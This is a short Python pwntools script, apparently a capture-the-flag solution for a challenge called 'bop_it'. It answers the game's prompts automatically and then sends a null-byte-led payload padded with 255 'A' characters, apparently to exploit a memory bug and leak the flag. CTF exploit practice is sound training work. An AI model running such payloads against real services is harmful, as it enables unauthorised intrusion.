from pwn import *

e = ELF("./bop_it")

if "--remote" in sys.argv:
  p = remote("shell.actf.co", 20702)
else:
  p = process(e.path)

curr = p.recvline()
while not curr.startswith("Flag"):
  print(curr)
  p.sendline(curr[0])

  curr = p.recvline()

p.sendline("\x00".ljust(255, "A"))

p.interactive()

  
